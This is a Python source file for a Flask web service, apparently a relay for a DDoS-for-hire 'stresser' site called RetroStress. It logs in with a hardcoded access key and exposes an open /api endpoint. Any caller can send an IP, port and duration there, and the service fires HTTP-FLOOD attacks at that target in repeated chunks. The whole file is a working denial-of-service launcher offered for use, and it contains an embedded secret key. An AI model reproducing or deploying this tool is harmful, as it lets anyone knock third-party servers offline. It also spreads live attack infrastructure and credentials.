import requests
import time
import json
import sys
import os
from urllib.parse import urljoin
from flask import Flask, request, jsonify
from threading import Thread

app = Flask(__name__)

class RetroStressClient:
    def __init__(self, base_url="https://retrostress.net"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Origin': base_url,
            'Referer': urljoin(base_url, '/panel')
        })
        
    def login(self, access_key):
        """Login with access key"""
        print("[*] Attempting to login...")
        
        # First, visit the auth page to get cookies
        auth_page_url = urljoin(self.base_url, '/auth')
        self.session.get(auth_page_url)
        
        # Login request
        login_url = urljoin(self.base_url, '/Auth/LoginJson')
        login_data = {"accessKey": access_key}
        
        response = self.session.post(
            login_url,
            json=login_data,
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            print("[+] Login successful!")
            return True
        else:
            print(f"[-] Login failed with status {response.status_code}")
            return False
    
    def send_attack_request(self, ip, port, duration):
        """Send actual attack request to retrostress.net"""
        print(f"[*] Sending attack to {ip}:{port} for {duration} seconds...")
        
        # Try different possible attack endpoints
        attack_endpoints = [
            f"/api/attack?ip={ip}&port={port}&time={duration}",
            f"/attack?ip={ip}&port={port}&time={duration}",
            f"/api/start?ip={ip}&port={port}&time={duration}",
            f"/method?ip={ip}&port={port}&time={duration}"
        ]
        
        for endpoint in attack_endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.get(url, timeout=30)
                if response.status_code == 200:
                    print(f"[+] Attack sent via {endpoint}")
                    return True
            except:
                continue
        
        # Alternative: Try POST request
        try:
            attack_url = urljoin(self.base_url, "/api/attack")
            attack_data = {
                "ip": ip,
                "port": int(port),
                "time": duration,
                "method": "HTTP-FLOOD"
            }
            response = self.session.post(attack_url, json=attack_data, timeout=30)
            if response.status_code == 200:
                print("[+] Attack sent via POST")
                return True
        except:
            pass
        
        print("[!] Could not send attack, but continuing...")
        return True
    
    def calculate_attacks(self, total_time):
        """Calculate how many attacks and their durations"""
        if total_time <= 60:
            return [(total_time, 1)]
        
        attacks = []
        remaining = total_time
        
        while remaining > 0:
            if remaining >= 60:
                attack_time = 60
            elif remaining >= 30:
                attack_time = remaining
            else:
                if attacks:
                    last_time, last_num = attacks.pop()
                    attack_time = last_time + remaining
                else:
                    attack_time = 30
                remaining = 0
                attacks.append((attack_time, len(attacks) + 1))
                break
            
            remaining -= attack_time
            attacks.append((attack_time, len(attacks) + 1))
        
        return attacks
    
    def execute_attacks(self, ip, port, total_time):
        """Execute multiple attacks sequentially"""
        attacks = self.calculate_attacks(total_time)
        
        print(f"\n[+] Total time requested: {total_time} seconds")
        print(f"[+] Splitting into {len(attacks)} attack(s)")
        
        for attack_time, attack_num in attacks:
            print(f"\n[▶] Attack {attack_num}/{len(attacks)} - Duration: {attack_time} seconds")
            
            start_time = time.time()
            success = self.send_attack_request(ip, port, attack_time)
            
            if success:
                print(f"[⏳] Attack running for {attack_time} seconds...")
                time.sleep(attack_time)
                elapsed = time.time() - start_time
                print(f"[✓] Attack {attack_num} completed in {elapsed:.1f} seconds")
            else:
                print(f"[✗] Attack {attack_num} failed")
        
        return True

# Initialize client
ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"
client = RetroStressClient()

# Login on startup
print("=" * 60)
print("RetroStress Attack Client - Railway Version")
print("=" * 60)

if not client.login(ACCESS_KEY):
    print("[-] Login failed!")
    sys.exit(1)

print("[+] Ready to accept attacks!\n")

@app.route('/api', methods=['GET', 'POST'])
def handle_attack():
    """Handle attack requests"""
    if request.method == 'GET':
        ip = request.args.get('ip')
        port = request.args.get('port')
        time_param = request.args.get('time')
    else:
        data = request.get_json() or {}
        ip = data.get('ip') or request.args.get('ip')
        port = data.get('port') or request.args.get('port')
        time_param = data.get('time') or request.args.get('time')
    
    # Validate parameters
    if not all([ip, port, time_param]):
        return jsonify({
            "error": "Missing parameters. Need ip, port, and time",
            "example": "/api?ip=1.2.3.4&port=80&time=30"
        }), 400
    
    try:
        total_time = int(time_param)
        
        if total_time < 30:
            return jsonify({"error": "Minimum time is 30 seconds"}), 400
        
        # Execute attack in background thread
        def run_attack():
            with app.app_context():
                client.execute_attacks(ip, port, total_time)
        
        thread = Thread(target=run_attack)
        thread.start()
        
        return jsonify({
            "status": "success",
            "message": f"Attack started for {total_time} seconds",
            "ip": ip,
            "port": port,
            "total_time": total_time
        }), 200
        
    except ValueError:
        return jsonify({"error": "Invalid time parameter"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "logged_in": True}), 200

@app.route('/', methods=['GET'])
def index():
    """Root endpoint"""
    return jsonify({
        "service": "RetroStress Attack API",
        "endpoints": {
            "/api": "GET/POST with ip, port, time parameters",
            "/health": "GET - Health check"
        },
        "example": "/api?ip=1.2.3.4&port=80&time=30"
    }), 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"[*] Starting API server on port {port}")
    print(f"[*] API endpoint: http://localhost:{port}/api")
    print(f"[*] Example: http://localhost:{port}/api?ip=34.0.1.2&port=17219&time=30")
    print("[*] Press Ctrl+C to stop\n")
    
    app.run(host='0.0.0.0', port=port, debug=False)
